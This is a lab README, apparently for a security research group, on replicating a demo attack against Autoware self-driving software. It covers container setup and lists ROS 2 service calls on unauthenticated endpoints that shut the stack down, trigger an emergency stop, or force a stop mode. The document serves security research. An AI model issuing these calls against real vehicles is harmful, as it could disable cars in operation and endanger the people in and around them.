# Spring 2026 Demo
This is for replicating the Autoware unauthenticated service endpoints attack demo from Spring 2026.

As of the time of writing, this demo is currently set up on the SORA WS 2 machine in the lab. You can also access the machine
through TeamViewer with the ID of 1248701202 (ask one of the Ph.D. students for the password). The same `docker-compose.yaml`
is in `~/autoware_launch`.

## Demo Set-Up
### Setting up the Demo Containers
```
$ docker compose up
$ docker exec -it attacker_node bash
```

### Test the Attacker Node
```
$ source /opt/ros/humble/setup.sh
$ ros2 service list
$ ros2 service call /autoware/shutdown std_srvs/srv/Trigger
```

### Tested API Endpoints
```
- /autoware/shutdown [std_srvs/srv/Trigger]
$ ros2 service call /autoware/shutdown std_srvs/srv/Trigger

- /api/autoware/set/emergency [tier4_external_api_msgs/srv/SetEmergency]
$ ros2 service call /api/autoware/set/emergency tier4_external_api_msgs/serv/SetEmergency "{emergency: true}"

- /api/operation_mode/change_to_stop [autoware_adapi_v1_msgs/srv/ChangeOperationMode]
$ ros2 service call /api/operation_mode/change_to_stop autoware_adapi_v1_msgs/srv/ChangeOperationMode "{}"
```

Note that using endpoints from Tier4/Autoware's AD API for the first time may result in the following error: `"The passed service type is invalid"`.

If so, see the comments in and run `get_endpoint_message_bindings.sh`.

